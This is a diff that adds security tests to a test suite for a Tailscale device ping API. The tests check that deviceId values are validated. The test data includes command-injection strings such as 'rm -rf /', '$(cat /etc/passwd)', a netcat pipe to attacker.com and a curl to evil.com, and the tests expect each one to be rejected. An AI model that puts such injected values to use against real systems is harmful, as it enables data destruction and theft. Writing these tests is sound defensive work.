@@ -453,6 +453,91 @@ describe('/api/workspace/tailscale/refresh', () => {
 });
 
 // ============================================================================
+// Tests: Security
+// ============================================================================
+
+describe('Security', () => {
+  beforeEach(() => {
+    vi.clearAllMocks();
+    __resetRateLimiterForTesting();
+  });
+
+  it('should reject deviceId with shell metacharacters', async () => {
+    const mockManager = createMockManager();
+    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);
+
+    const request = createMockRequest({
+      method: 'POST',
+      url: 'http://localhost:3000/api/workspace/tailscale/ping',
+      body: { deviceId: 'node123; rm -rf /' },
+    });
+    const response = await pingHandler(request);
+    const data = await response.json();
+
+    expect(response.status).toBe(400);
+    expect(data.code).toBe('INVALID_REQUEST');
+  });
+
+  it('should reject extremely long deviceId', async () => {
+    const mockManager = createMockManager();
+    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);
+
+    const request = createMockRequest({
+      method: 'POST',
+      url: 'http://localhost:3000/api/workspace/tailscale/ping',
+      body: { deviceId: 'a'.repeat(100) },
+    });
+    const response = await pingHandler(request);
+    const data = await response.json();
+
+    expect(response.status).toBe(400);
+    expect(data.error).toContain('Invalid deviceId format');
+  });
+
+  it('should reject deviceId with special characters', async () => {
+    const mockManager = createMockManager();
+    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);
+
+    const maliciousIds = [
+      'node`whoami`',
+      'node$(cat /etc/passwd)',
+      'node | nc attacker.com',
+      'node && curl evil.com',
+      'node\n/etc/passwd',
+    ];
+
+    for (const deviceId of maliciousIds) {
+      const request = createMockRequest({
+        method: 'POST',
+        url: 'http://localhost:3000/api/workspace/tailscale/ping',
+        body: { deviceId },
+      });
+      const response = await pingHandler(request);
+      expect(response.status).toBe(400);
+    }
+  });
+
+  it('should accept valid deviceId formats', async () => {
+    const mockManager = createMockManager();
+    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);
+
+    const validIds = ['node123', 'abc-def-123', 'myDevice_01', 'n123456789'];
+
+    for (const deviceId of validIds) {
+      __resetRateLimiterForTesting();
+      const request = createMockRequest({
+        method: 'POST',
+        url: 'http://localhost:3000/api/workspace/tailscale/ping',
+        body: { deviceId },
+      });
+      const response = await pingHandler(request);
+      // These should not be rejected for format (may be 404 if not found)
+      expect(response.status).not.toBe(400);
+    }
+  });
+});
+
+// ============================================================================
 // Tests: Rate Limiting
 // ============================================================================
 
